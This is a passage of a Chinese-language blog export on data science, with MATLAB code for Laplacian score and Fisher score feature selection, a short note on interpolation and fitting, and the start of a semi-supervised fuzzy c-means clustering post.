[ones(10,1);ones(15,1)*2;ones(10,1)*3;ones(15,1)*4];%       options = [];%       options.NeighborMode = 'Supervised';%       options.gnd = gnd;%       options.bLDA = 1;%       W = constructW(fea,options);      %       %%    For more details about the different ways to construct the W, please%    refer:%       Deng Cai, Xiaofei He and Jiawei Han, "Document Clustering Using%       Locality Preserving Indexing" IEEE TKDE, Dec. 2005.%    %%    Written by Deng Cai (dengcai2 AT cs.uiuc.edu), April/2004, Feb/2006,%                                             May/2007% bSpeed  = 1;if (~exist('options','var'))   options = [];endif isfield(options,'Metric')    warning('This function has been changed and the Metric is no longer be supported');endif ~isfield(options,'bNormalized')    options.bNormalized = 0;end%=================================================if ~isfield(options,'NeighborMode')    options.NeighborMode = 'KNN';endswitch lower(options.NeighborMode)    case {lower('KNN')}  %For simplicity, we include the data point itself in the kNN        if ~isfield(options,'k')            options.k = 5;        end    case {lower('Supervised')}        if ~isfield(options,'bLDA')            options.bLDA = 0;        end        if options.bLDA            options.bSelfConnected = 1;        end        if ~isfield(options,'k')            options.k = 0;        end        if ~isfield(options,'gnd')            error('Label(gnd) should be provided under ''Supervised'' NeighborMode!');        end        if ~isempty(fea) && length(options.gnd) ~= size(fea,1)            error('gnd doesn''t match with fea!');        end    otherwise        error('NeighborMode does not exist!');end%=================================================if ~isfield(options,'WeightMode')    options.WeightMode = 'HeatKernel';endbBinary = 0;bCosine = 0;switch lower(options.WeightMode)    case {lower('Binary')}        bBinary = 1;     case {lower('HeatKernel')}        if ~isfield(options,'t')            nSmp = size(fea,1);            if nSmp > 3000                D = EuDist2(fea(randsample(nSmp,3000),:));            else                D = EuDist2(fea);            end            options.t = mean(mean(D));        end    case {lower('Cosine')}        bCosine = 1;    otherwise        error('WeightMode does not exist!');end%=================================================if ~isfield(options,'bSelfConnected')    options.bSelfConnected = 0;end%=================================================if isfield(options,'gnd')     nSmp = length(options.gnd);else    nSmp = size(fea,1);endmaxM = 62500000; %500MBlockSize = floor(maxM/(nSmp*3));if strcmpi(options.NeighborMode,'Supervised')    Label = unique(options.gnd);    nLabel = length(Label);    if options.bLDA        G = zeros(nSmp,nSmp);        for idx=1:nLabel            classIdx = options.gnd==Label(idx);            G(classIdx,classIdx) = 1/sum(classIdx);        end        W = sparse(G);        return;    end    switch lower(options.WeightMode)        case {lower('Binary')}            if options.k > 0                G = zeros(nSmp*(options.k+1),3);                idNow = 0;                for i=1:nLabel                    classIdx = find(options.gnd==Label(i));                    D = EuDist2(fea(classIdx,:),[],0);                    [dump idx] = sort(D,2); % sort each row                    clear D dump;                    idx = idx(:,1:options.k+1);                    nSmpClass = length(classIdx)*(options.k+1);                    G(idNow+1:nSmpClass+idNow,1) = repmat(classIdx,[options.k+1,1]);                    G(idNow+1:nSmpClass+idNow,2) = classIdx(idx(:));                    G(idNow+1:nSmpClass+idNow,3) = 1;                    idNow = idNow+nSmpClass;                    clear idx                end                G = sparse(G(:,1),G(:,2),G(:,3),nSmp,nSmp);                G = max(G,G');            else                G = zeros(nSmp,nSmp);                for i=1:nLabel                    classIdx = find(options.gnd==Label(i));                    G(classIdx,classIdx) = 1;                end            end            if ~options.bSelfConnected                for i=1:size(G,1)                    G(i,i) = 0;                end            end            W = sparse(G);        case {lower('HeatKernel')}            if options.k > 0                G = zeros(nSmp*(options.k+1),3);                idNow = 0;                for i=1:nLabel                    classIdx = find(options.gnd==Label(i));                    D = EuDist2(fea(classIdx,:),[],0);                    [dump idx] = sort(D,2); % sort each row                    clear D;                    idx = idx(:,1:options.k+1);                    dump = dump(:,1:options.k+1);                    dump = exp(-dump/(2*options.t^2));                    nSmpClass = length(classIdx)*(options.k+1);                    G(idNow+1:nSmpClass+idNow,1) = repmat(classIdx,[options.k+1,1]);                    G(idNow+1:nSmpClass+idNow,2) = classIdx(idx(:));                    G(idNow+1:nSmpClass+idNow,3) = dump(:);                    idNow = idNow+nSmpClass;                    clear dump idx                end                G = sparse(G(:,1),G(:,2),G(:,3),nSmp,nSmp);            else                G = zeros(nSmp,nSmp);                for i=1:nLabel                    classIdx = find(options.gnd==Label(i));                    D = EuDist2(fea(classIdx,:),[],0);                    D = exp(-D/(2*options.t^2));                    G(classIdx,classIdx) = D;                end            end            if ~options.bSelfConnected                for i=1:size(G,1)                    G(i,i) = 0;                end            end            W = sparse(max(G,G'));        case {lower('Cosine')}            if ~options.bNormalized                fea = NormalizeFea(fea);            end            if options.k > 0                G = zeros(nSmp*(options.k+1),3);                idNow = 0;                for i=1:nLabel                    classIdx = find(options.gnd==Label(i));                    D = fea(classIdx,:)*fea(classIdx,:)';                    [dump idx] = sort(-D,2); % sort each row                    clear D;                    idx = idx(:,1:options.k+1);                    dump = -dump(:,1:options.k+1);                    nSmpClass = length(classIdx)*(options.k+1);                    G(idNow+1:nSmpClass+idNow,1) = repmat(classIdx,[options.k+1,1]);                    G(idNow+1:nSmpClass+idNow,2) = classIdx(idx(:));                    G(idNow+1:nSmpClass+idNow,3) = dump(:);                    idNow = idNow+nSmpClass;                    clear dump idx                end                G = sparse(G(:,1),G(:,2),G(:,3),nSmp,nSmp);            else                G = zeros(nSmp,nSmp);                for i=1:nLabel                    classIdx = find(options.gnd==Label(i));                    G(classIdx,classIdx) = fea(classIdx,:)*fea(classIdx,:)';                end            end            if ~options.bSelfConnected                for i=1:size(G,1)                    G(i,i) = 0;                end            end            W = sparse(max(G,G'));        otherwise            error('WeightMode does not exist!');    end    return;endif bCosine && ~options.bNormalized    Normfea = NormalizeFea(fea);endif strcmpi(options.NeighborMode,'KNN') && (options.k > 0)    if ~(bCosine && options.bNormalized)        G = zeros(nSmp*(options.k+1),3);        for i = 1:ceil(nSmp/BlockSize)            if i == ceil(nSmp/BlockSize)                smpIdx = (i-1)*BlockSize+1:nSmp;                dist = EuDist2(fea(smpIdx,:),fea,0);                if bSpeed                    nSmpNow = length(smpIdx);                    dump = zeros(nSmpNow,options.k+1);                    idx = dump;                    for j = 1:options.k+1                        [dump(:,j),idx(:,j)] = min(dist,[],2);                        temp = (idx(:,j)-1)*nSmpNow+[1:nSmpNow]';                        dist(temp) = 1e100;                    end                else                    [dump idx] = sort(dist,2); % sort each row                    idx = idx(:,1:options.k+1);                    dump = dump(:,1:options.k+1);                end                if ~bBinary                    if bCosine                        dist = Normfea(smpIdx,:)*Normfea';                        dist = full(dist);                        linidx = [1:size(idx,1)]';                        dump = dist(sub2ind(size(dist),linidx(:,ones(1,size(idx,2))),idx));                    else                        dump = exp(-dump/(2*options.t^2));                    end                end                G((i-1)*BlockSize*(options.k+1)+1:nSmp*(options.k+1),1) = repmat(smpIdx',[options.k+1,1]);                G((i-1)*BlockSize*(options.k+1)+1:nSmp*(options.k+1),2) = idx(:);                if ~bBinary                    G((i-1)*BlockSize*(options.k+1)+1:nSmp*(options.k+1),3) = dump(:);                else                    G((i-1)*BlockSize*(options.k+1)+1:nSmp*(options.k+1),3) = 1;                end            else                smpIdx = (i-1)*BlockSize+1:i*BlockSize;                dist = EuDist2(fea(smpIdx,:),fea,0);                if bSpeed                    nSmpNow = length(smpIdx);                    dump = zeros(nSmpNow,options.k+1);                    idx = dump;                    for j = 1:options.k+1                        [dump(:,j),idx(:,j)] = min(dist,[],2);                        temp = (idx(:,j)-1)*nSmpNow+[1:nSmpNow]';                        dist(temp) = 1e100;                    end                else                    [dump idx] = sort(dist,2); % sort each row                    idx = idx(:,1:options.k+1);                    dump = dump(:,1:options.k+1);                end                if ~bBinary                    if bCosine                        dist = Normfea(smpIdx,:)*Normfea';                        dist = full(dist);                        linidx = [1:size(idx,1)]';                        dump = dist(sub2ind(size(dist),linidx(:,ones(1,size(idx,2))),idx));                    else                        dump = exp(-dump/(2*options.t^2));                    end                end                G((i-1)*BlockSize*(options.k+1)+1:i*BlockSize*(options.k+1),1) = repmat(smpIdx',[options.k+1,1]);                G((i-1)*BlockSize*(options.k+1)+1:i*BlockSize*(options.k+1),2) = idx(:);                if ~bBinary                    G((i-1)*BlockSize*(options.k+1)+1:i*BlockSize*(options.k+1),3) = dump(:);                else                    G((i-1)*BlockSize*(options.k+1)+1:i*BlockSize*(options.k+1),3) = 1;                end            end        end        W = sparse(G(:,1),G(:,2),G(:,3),nSmp,nSmp);    else        G = zeros(nSmp*(options.k+1),3);        for i = 1:ceil(nSmp/BlockSize)            if i == ceil(nSmp/BlockSize)                smpIdx = (i-1)*BlockSize+1:nSmp;                dist = fea(smpIdx,:)*fea';                dist = full(dist);                if bSpeed                    nSmpNow = length(smpIdx);                    dump = zeros(nSmpNow,options.k+1);                    idx = dump;                    for j = 1:options.k+1                        [dump(:,j),idx(:,j)] = max(dist,[],2);                        temp = (idx(:,j)-1)*nSmpNow+[1:nSmpNow]';                        dist(temp) = 0;                    end                else                    [dump idx] = sort(-dist,2); % sort each row                    idx = idx(:,1:options.k+1);                    dump = -dump(:,1:options.k+1);                end                G((i-1)*BlockSize*(options.k+1)+1:nSmp*(options.k+1),1) = repmat(smpIdx',[options.k+1,1]);                G((i-1)*BlockSize*(options.k+1)+1:nSmp*(options.k+1),2) = idx(:);                G((i-1)*BlockSize*(options.k+1)+1:nSmp*(options.k+1),3) = dump(:);            else                smpIdx = (i-1)*BlockSize+1:i*BlockSize;                dist = fea(smpIdx,:)*fea';                dist = full(dist);                if bSpeed                    nSmpNow = length(smpIdx);                    dump = zeros(nSmpNow,options.k+1);                    idx = dump;                    for j = 1:options.k+1                        [dump(:,j),idx(:,j)] = max(dist,[],2);                        temp = (idx(:,j)-1)*nSmpNow+[1:nSmpNow]';                        dist(temp) = 0;                    end                else                    [dump idx] = sort(-dist,2); % sort each row                    idx = idx(:,1:options.k+1);                    dump = -dump(:,1:options.k+1);                end                G((i-1)*BlockSize*(options.k+1)+1:i*BlockSize*(options.k+1),1) = repmat(smpIdx',[options.k+1,1]);                G((i-1)*BlockSize*(options.k+1)+1:i*BlockSize*(options.k+1),2) = idx(:);                G((i-1)*BlockSize*(options.k+1)+1:i*BlockSize*(options.k+1),3) = dump(:);            end        end        W = sparse(G(:,1),G(:,2),G(:,3),nSmp,nSmp);    end    if bBinary        W(logical(W)) = 1;    end    if isfield(options,'bSemiSupervised') && options.bSemiSupervised        tmpgnd = options.gnd(options.semiSplit);        Label = unique(tmpgnd);        nLabel = length(Label);        G = zeros(sum(options.semiSplit),sum(options.semiSplit));        for idx=1:nLabel            classIdx = tmpgnd==Label(idx);            G(classIdx,classIdx) = 1;        end        Wsup = sparse(G);        if ~isfield(options,'SameCategoryWeight')            options.SameCategoryWeight = 1;        end        W(options.semiSplit,options.semiSplit) = (Wsup>0)*options.SameCategoryWeight;    end    if ~options.bSelfConnected        W = W - diag(diag(W));    end    if isfield(options,'bTrueKNN') && options.bTrueKNN    else        W = max(W,W');    end    return;end% strcmpi(options.NeighborMode,'KNN') & (options.k == 0)% Complete Graphswitch lower(options.WeightMode)    case {lower('Binary')}        error('Binary weight can not be used for complete graph!');    case {lower('HeatKernel')}        W = EuDist2(fea,[],0);        W = exp(-W/(2*options.t^2));    case {lower('Cosine')}        W = full(Normfea*Normfea');    otherwise        error('WeightMode does not exist!');endif ~options.bSelfConnected    for i=1:size(W,1)        W(i,i) = 0;    endendW = max(W,W');</code></pre><h3 id="EuDist2-m"><a href="#EuDist2-m" class="headerlink" title="EuDist2.m"></a>EuDist2.m</h3><pre class=" language-lang-matlab"><code class="language-lang-matlab">function D = EuDist2(fea_a,fea_b,bSqrt)%EUDIST2 Efficiently Compute the Euclidean Distance Matrix by Exploring the%Matlab matrix operations.%%   D = EuDist(fea_a,fea_b)%   fea_a:    nSample_a * nFeature%   fea_b:    nSample_b * nFeature%   D:      nSample_a * nSample_a%       or  nSample_a * nSample_b%%    Examples:%%       a = rand(500,10);%       b = rand(1000,10);%%       A = EuDist2(a); % A: 500*500%       D = EuDist2(a,b); % D: 500*1000%%   version 2.1 --November/2011%   version 2.0 --May/2009%   version 1.0 --November/2005%%   Written by Deng Cai (dengcai AT gmail.com)if ~exist('bSqrt','var')    bSqrt = 1;endif (~exist('fea_b','var')) || isempty(fea_b)    aa = sum(fea_a.*fea_a,2);    ab = fea_a*fea_a';    if issparse(aa)        aa = full(aa);    end    D = bsxfun(@plus,aa,aa') - 2*ab;    D(D<0) = 0;    if bSqrt        D = sqrt(D);    end    D = max(D,D');else    aa = sum(fea_a.*fea_a,2);    bb = sum(fea_b.*fea_b,2);    ab = fea_a*fea_b';    if issparse(aa)        aa = full(aa);        bb = full(bb);    end    D = bsxfun(@plus,aa,bb') - 2*ab;    D(D<0) = 0;    if bSqrt        D = sqrt(D);    endend</code></pre><h3 id="LaplacianScore-m"><a href="#LaplacianScore-m" class="headerlink" title="LaplacianScore.m"></a>LaplacianScore.m</h3><pre class=" language-lang-matlab"><code class="language-lang-matlab">function [Y] = LaplacianScore(X, W)%    Usage:%    [Y] = LaplacianScore(X, W)%%    X: Rows of vectors of data points%    W: The affinity matrix.%    Y: Vector of (1-LaplacianScore) for each feature.%      The features with larger y are more important.%%    Examples:%%       fea = rand(50,70);%       options = [];%       options.Metric = 'Cosine';%       options.NeighborMode = 'KNN';%       options.k = 5;%       options.WeightMode = 'Cosine';%       W = constructW(fea,options);% %       LaplacianScore = LaplacianScore(fea,W);%       [junk, index] = sort(-LaplacianScore);%       %       newfea = fea(:,index);%       %the features in newfea will be sorted based on their importance.%%    Type "LaplacianScore" for a self-demo.%% See also constructW%%Reference:%%   Xiaofei He, Deng Cai and Partha Niyogi, "Laplacian Score for Feature Selection".%   Advances in Neural Information Processing Systems 18 (NIPS 2005),%   Vancouver, Canada, 2005.   %%   Deng Cai, 2004/08+% if nargin == 0, selfdemo; return; end[nSmp,nFea] = size(X);if size(W,1) ~= nSmp%若数据集有m个样本，则W为m行m列的矩阵    error('W is error');endD = full(sum(W,2));%若数据集有m个样本，则D为m行1列的矩阵L = W;allone = ones(nSmp,1);tmp1 = D'*X;D = sparse(1:nSmp,1:nSmp,D,nSmp,nSmp);%建立稀疏矩阵DPrime = sum((X'*D)'.*X)-tmp1.*tmp1/sum(diag(D));LPrime = sum((X'*L)'.*X)-tmp1.*tmp1/sum(diag(D));DPrime(find(DPrime < 1e-12)) = 10000;Y = LPrime./DPrime;Y = Y';Y = full(Y);</code></pre><h3 id="LS-final-m"><a href="#LS-final-m" class="headerlink" title="LS_final.m"></a>LS_final.m</h3><pre class=" language-lang-matlab"><code class="language-lang-matlab">function [redu,LS,List] = LS_final(X,Y,selectrate)%laplacian score%input:   X, the data, each row is an instance%            Y, the label in 1 2 3 ... format%           selectrate， 0.1 0.2 0.3...0.9选择的属性数目占总属性数目的比例%output%      redu %if selectrate=0.5, redu为top 50% 的属性%     LS%各个特征的Fisher score得分%     List%各个特征按照Fisher score得分排序% % load iris.dat% [redu,LS,List]=LS_final(iris(:,1:end-1),iris(:,end),0.5)% numC = max(Y);%类别数目[~, numF] = size(X);%特征总数numFm=ceil(selectrate*numF);%最终选择的属性的数目a=[X,Y];mfilename='LaplacianScore';feaNorm = mynorm(a(:,1:end-1),2);%mynorm(iris(:,1:end-1),2);%%%%%%%%%%%%%[~,n]=size(a);fea = a(:,1:end-1) ./ repmat(max(1e-10,feaNorm),1,n-1);options = [];options.Metric = 'Cosine';options.NeighborMode = 'KNN';options.WeightMode = 'Cosine';options.k = 3;W = constructW(fea,options);[LS] = feval(mfilename,a(:,1:end-1),W);%feval求函数的值[~, List] = sort(LS', 'descend');%各个特征的排序redu=List(1:m);</code></pre><h3 id="mynorm-m"><a href="#mynorm-m" class="headerlink" title="mynorm.m"></a>mynorm.m</h3><pre class=" language-lang-matlab"><code class="language-lang-matlab">function V = mynorm(M,dim)%   MYNORM: 计算矩阵某个维度上的向量的2范数%   V = mynorm(M,dim);  沿第dim维计算向量2范数%   V = mynorm(M);      求列向量的模，相当于V = mynorm(M,1);if (nargin == 1)    dim = 1;elseif (nargin > 2)    error('only accept inputs.');endV = sum(M.^2,dim).^.5;</code></pre><h3 id="NormalizeFea-m"><a href="#NormalizeFea-m" class="headerlink" title="NormalizeFea.m"></a>NormalizeFea.m</h3><pre class=" language-lang-matlab"><code class="language-lang-matlab">function fea = NormalizeFea(fea,row,norm)% if row == 1, normalize each row of fea to have unit norm;% if row == 0, normalize each column of fea to have unit norm;%% if norm == p, use p-norm, default norm=2;% %   version 4.0 --May/2016 %   version 3.0 --Jan/2012 %   version 2.0 --Jan/2012 %   version 1.0 --Oct/2003 %%   Written by Deng Cai (dengcai AT gmail.com)%              Wei Qian (qwqjzju@gmail.com)if ~exist('row','var')    row = 1;endif ~exist('norm','var')    norm = 2;endif norm < 1    error('It is not a norm when p small than 1!');endif row    nSmp = size(fea,1);    feaNorm = max(1e-14,full(sum(abs(fea).^norm,2)));    fea = spdiags(feaNorm.^-(1./norm),0,nSmp,nSmp)*fea;else    nSmp = size(fea,2);    feaNorm = max(1e-14,full(sum(abs(fea).^norm,1))');    fea = fea*spdiags(feaNorm.^-(1./norm),0,nSmp,nSmp);endreturn;if row    [nSmp, mFea] = size(fea);    if issparse(fea)        fea2 = fea';        feaNorm = mynorm(fea2,1);        for i = 1:nSmp            fea2(:,i) = fea2(:,i) ./ max(1e-10,feaNorm(i));        end        fea = fea2';    else        feaNorm = sum(fea.^2,2).^.5;        fea = fea./feaNorm(:,ones(1,mFea));    endelse    [mFea, nSmp] = size(fea);    if issparse(fea)        feaNorm = mynorm(fea,1);        for i = 1:nSmp            fea(:,i) = fea(:,i) ./ max(1e-10,feaNorm(i));        end    else        feaNorm = sum(fea.^2,1).^.5;        fea = fea./feaNorm(ones(1,mFea),:);    endend</code></pre><h3 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h3><pre><code>%LS_finalthe main function of laplacian score. this program computes the laplacian score and sort attributes in descending order in terms of the laplacian scores%LaplacianScorecompute the laplacian score% examplethis is an example of how to use this program for feature selection</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://blog.csdn.net/zhenaoxi1077/article/details/82791281" target="_blank" rel="noopener">常用的特征选择方法</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 特征工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>特征选择FisherScore</title>
      <link href="2020/11/03/te-zheng-xuan-ze-fisherscore/"/>
      <url>2020/11/03/te-zheng-xuan-ze-fisherscore/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>如果了解过数学建模，那么你一定会听说过主成分分析。事实上，数学建模比赛很少用到主成分分析，主要是烂大街了，但不得不说……主成分分析解决某些问题的时候还是挺香的。</p><p>主成分分析是一种特征提取方法（对的，不是特征选择方法），主成分分析常用于降维，但有个问题是经过主成分分析降维后的数据不是原数据的子集（特征子空间）。这样的数据并不利于开展后续的一些工作。在这里介绍一种比较常用的特征选择方法。</p><h2 id="特征选择方法"><a href="#特征选择方法" class="headerlink" title="特征选择方法"></a>特征选择方法</h2><p>特征选择方法主要分为三类：1）Filter（过滤式）； 2）Wrapper（包裹式） ；3） Embedded（嵌入式） 。</p><ul><li><p>Filter方法（过滤式）</p><p>​    对每个特征“打分”，然后依据权重排序。</p><p>常见方法：</p><ul><li>Chi-squared test（卡方检验）</li><li>Information gain（信息增益）</li><li>Correlation coefficient scores（相关系数）</li><li>Wrapper方法（包裹式）</li></ul><p>将子集的选择看作是一个搜索寻优问题，生成不同的组合，比较。这样就将子集的选择看作是一个优化问题，这里有很多的优化算法可以解决，如GA、PSO（如：优化算法-粒子群算法）、DE、ABC（如：优化算法-人工蜂群算法）等。</p><p>常见方法：</p><p> 递归特征消除算法 </p></li></ul><ul><li><p>Embedded方法（嵌入式）</p><p>在模型既定的情况下学习出对提高模型准确性最好的特征。也就是在确定模型的过程中，挑选出那些对模型的训练有重要意义的特征。</p><p>常见方法：</p><p>简单易学的机器学习算法—岭回归（Ridge Regression），就是线性回归过程加入了L2正则项。</p></li></ul><h2 id="FisherScore"><a href="#FisherScore" class="headerlink" title="FisherScore"></a>FisherScore</h2><h3 id="数学原理"><a href="#数学原理" class="headerlink" title="数学原理"></a>数学原理</h3><p>Fisher Score是目前较为广泛使用的一种有监督的特征选择方法, 原理较为简单，其核心思想是在最大化类间散度的同时最小化类内散度. 设数据集为${ z_i,y_i },i=1,2..,N$ ,其中$z_i \in R^{N \times 1}$为数据特征, $y_i \in {1,2,…,C } $为类别标签, $D$ 为数据维数, $C$ 为类别总数, $N$ 是样本个数,其中 $tr(·)$ 表示矩阵的迹, 则数据矩阵$z_i \in R^{D \times N}$的Fisher Score 其定义为：</p><script type="math/tex; mode=display">FS(Z)=tr{(S_t)^{-1}S_b}</script><p>类间散度矩阵：</p><script type="math/tex; mode=display">S_b=\sum_{i=1}^Cn_i(r_i-r)(r_i-r)^T</script><p>总散度矩阵 ：</p><script type="math/tex; mode=display">S_t=\sum_{j=1}^N(z_j-r)(z_j-r)^T</script><p>其中$n_i$为第$i$类数据的个数，${ i }$为第$i$类数据下标的集合，</p><p>第$i$类数据的中心：</p><script type="math/tex; mode=display">r_i= \frac{1}{n_i} \sum_{j \in \{i \}Z_j }</script><p>所有数据的中心:</p><script type="math/tex; mode=display">r = \frac{1}{N}\sum^N_{j=1}Z_j</script><p>最终得到的FS即使为各个特征的分数，分数越高则表示该特征对标签的影响程度越高。</p><h3 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h3><p>FisherScore适用于对<strong>离散</strong>的数值作为因变量（即标签）筛选出特征评分。所有也有学者用这种方法来完成图像分类。。。</p><p>没了，之后再介绍一下<strong>Laplacian score</strong>吧~</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><pre class=" language-lang-matlab"><code class="language-lang-matlab">function [redu,W,List] = fsFisher(X,Y,selectrate)%Fisher Score, use the N var formulation%input:   X, the data, each row is an instance%            Y, the label in 1 2 3 ... format%           selectrate， 0.1 0.2 0.3...0.9选择的属性数目占总属性数目的比例%output%      redu %if selectrate=0.5, redu为top 50% 的属性%     W%各个特征的Fisher score得分%     List%各个特征按照Fisher score得分排序%调用格式 [W,List]=fsFisher(c,d)numC = max(Y);%类别数目[~, numF] = size(X);%特征总数numFm=ceil(selectrate*numF);%最终选择的属性的数目W = zeros(1,numF);% statistic for classescIDX = cell(numC,1);%cIDX存储属于某一类的样本n_i = zeros(numC,1);%n_i存储每一类的样本数for j = 1:numC    cIDX{j} = find(Y(:)==j);    n_i(j) = length(cIDX{j});end% calculate score for each featuresfor i = 1:numF%    temp1 = 0;    temp2 = 0;    f_i = X(:,i);    u_i = mean(f_i);%每一个特征的均值    for j = 1:numC%类别数numC        u_cj = mean(f_i(cIDX{j}));        var_cj = var(f_i(cIDX{j}),1);        temp1 = temp1 + n_i(j) * (u_cj-u_i)^2;        temp2 = temp2 + n_i(j) * var_cj;    end%     if temp1 == 0%         out.W(i) = 0;%     else        if temp2 == 0            W(i) = 1000000;%分母为0，应为正无穷，用一个很大的数代替        else            W(i) = temp1/temp2;        end%     endend[~, List] = sort(W, 'descend');%各个特征的排序redu=List(1:m);% redu=[];% for i=1:m%     redu=[redu find(List==i)];% endend</code></pre><pre class=" language-lang-matlab"><code class="language-lang-matlab">%clear;clc;close allload iris.dat    %导入数据[redu,FS,List] = fsFisher(iris(:,1:4),iris(:,5),0.6)</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://blog.csdn.net/jliang3/article/details/88912464" target="_blank" rel="noopener">特征选择/筛选方法总结</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 特征工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拟合&amp;插值&amp;函数逼近</title>
      <link href="2020/11/03/ni-he-cha-zhi-han-shu-bi-jin/"/>
      <url>2020/11/03/ni-he-cha-zhi-han-shu-bi-jin/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h2 id="插值"><a href="#插值" class="headerlink" title="插值"></a>插值</h2><h2 id="拟合"><a href="#拟合" class="headerlink" title="拟合"></a>拟合</h2><h2 id="函数逼近"><a href="#函数逼近" class="headerlink" title="函数逼近"></a>函数逼近</h2><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>插值需要满足：$y(x_i) = y_i$，即观测值需要等于实际值；</p><p>拟合只需要观测值近似实际值；</p><p>函数逼近是已知函数但$y_i/x_i$未知。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://blog.csdn.net/daaikuaichuan/article/details/73870209" target="_blank" rel="noopener">MATLAB回归、插值、逼近、拟合总结</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>半监督模糊聚类(SFCM)</title>
      <link href="2020/11/02/ban-jian-du-mo-hu-ju-lei-sfcm/"/>
      <url>2020/11/02/ban-jian-du-mo-hu-ju-lei-sfcm/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>在上一篇中已经介绍过<a href="https://www.studydrive.club/2020/11/02/mo-hu-c-jun-zhi-ju-lei-fcm/" target="_blank" rel="noopener">模糊C均值聚类</a>了，模糊C均值聚类是一种<strong>无监督学习</strong>方法，其无法利用标签信息，在这里将介绍一种<strong>有监督学习</strong>的模糊聚类算法——经典的半监督模糊聚类SFCM。</p><h2 id="FCM"><a href="#FCM" class="headerlink" title="FCM"></a>FCM</h2><p>先来复习一下FCM的目标函数：</p><script type="math/tex; mode=display">J_{fcm}(U,V) = \sum_{i=1}^c \sum_{j=1}^n u_{ij}^m ||x_j-v_i||^2</script><script type="math/tex; mode=display">s.t. \quad u_{ij} \in [0,1]; \sum_{i=1}^c u_{ij}=1</script><h2 id="SFCM"><a href="#SFCM" class="headerlink" title="SFCM"></a>SFCM</h2><p>再看SFCM的目标函数：</p><script type="math/tex; mode=display">J_{sfcm}(U,V) = \sum_{i=1}^c \sum_{j=1}^n u_{ij}^m ||x_j-v_i||^2 + \alpha \sum_{i=1}^c \sum_{j=1}^n (u_{ij} - \widetilde{u}_{ij})^m ||x_j - v_i||^2</script><script type="math/tex; mode=display">s.t. \quad u_{ij} \in [0,1]; \sum_{i=1}^c u_{ij}=1</script><p>仔细看一下的话就会发现SFCM的目标函数相比FCM增加了</p><script type="math/tex; mode=display">\alpha \sum_{i=1}^c \sum_{j=1}^n (u_{ij} - \widetilde{u}_{ij})^m ||x_j - v_i||^2</script><p>这一项，再看一下增加的这一项是不是跟FCM也很像? 对，就在隶属度矩阵$u<em>{ij}$后面减去一个$\widetilde{u}</em>{ij}$（注意区分符号上面有无波浪线），以及在该项前面增加一个正则化项系数$\alpha$（这参数的值是自己设定的）。</p><p>这里来解释一下先验隶属度矩阵$ \widetilde{u}<em>{ij} $，先验隶属度矩阵$\widetilde{u}</em>{ij}$的大小与隶属度矩阵$u<em>{ij}$相同，与$u</em>{ij}$一样都是​c行​n列。( i={1,2…c}; j={1,2…n} )</p><p>假设某个数据集有5个样本，分为3类，即$n=5,c=3$。假设只给定前面三个样本标签，且前面三个样本分别属于第一类、第二类、第三类，第四第五个样本的标签信息未知（即没有给定标签），则其$\widetilde{u}_{ij}$为：</p><script type="math/tex; mode=display">\left[ \begin{matrix} 1 & 0 & 0 & 0 & 0\\ 0 & 1 & 0 & 0 & 0 \\ 0 & 0 & 1 & 0 & 0 \end{matrix} \right]</script><p>即样本第i个样本属于第几类，就在第几行写为1，其余的元素全为0。由于需要求目标函数值最小的极小值点，在没有给定样本的隶属度一定的i情况下，SFCM的隶属度矩阵$u<em>{ij}$与给定的先验信息$\widetilde{u}</em>{ij}$越接近则目标函数值越小（其他标签未知样本的隶属度固定的情况下）。</p><p>再来看迭代式，仍然是用拉格朗日乘数法推导得到，在这里设定$m=2$,得到：</p><script type="math/tex; mode=display">u_{ij} = \frac{1}{1+a} [ \frac{1+\alpha(1-\sum_{i=1}^c \widetilde{u}_{ij} ) }{ \sum_{i=1}^c \frac{||x_j-v_i||^2 }{ ||x_j-v_k||^2 } } +\alpha \widetilde{u}_{ij} ]</script><script type="math/tex; mode=display">v_i = \frac{\sum_{j=1}^n u_{ij}^2 x_j }{ \sum_{j=1}^n u_{ij}^2 }</script><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><pre class=" language-lang-matlab"><code class="language-lang-matlab">function [U,center] = SFCMclust(data, cluster_n,data_label)data_n = size(data, 1); % 求出data的第一维(rows)数,即样本个数in_n = size(data, 2);   % 求出data的第二维(columns)数，即特征值长度% 默认操作参数options = [2; % 隶属度矩阵U的指数   100;                 % 最大迭代次数   1e-5;               % 隶属度最小变化量,迭代终止条件   1];                 % 每次迭代是否输出信息标志%将options 中的分量分别赋值给四个变量;expo = options(1);          % 隶属度矩阵U的指数max_iter = options(2);  % 最大迭代次数min_impro = options(3);  % 隶属度最小变化量,迭代终止条件display = options(4);  % 每次迭代是否输出信息标志obj_fcn = zeros(max_iter, 1); % 初始化输出参数obj_fcn%初始化F[~,F] = initcenter(data_label,data,cluster_n);%初始化center(随机选取样本作为初始聚类中心)rn = randperm(size(F,2));rn = rn(1:cluster_n);center0 = data(rn,:);% 初始化模糊分配矩阵,使U满足列上相加为1,cluster_n=2,用户填上去的种类数c=cluster_na=5;%5比6好% 随机初始化隶属度矩阵U = rand(size(F));U = U./sum(U);% Main loop  主要循环for i = 1:max_iter   if i==1       dist = distfcm(center0, data);        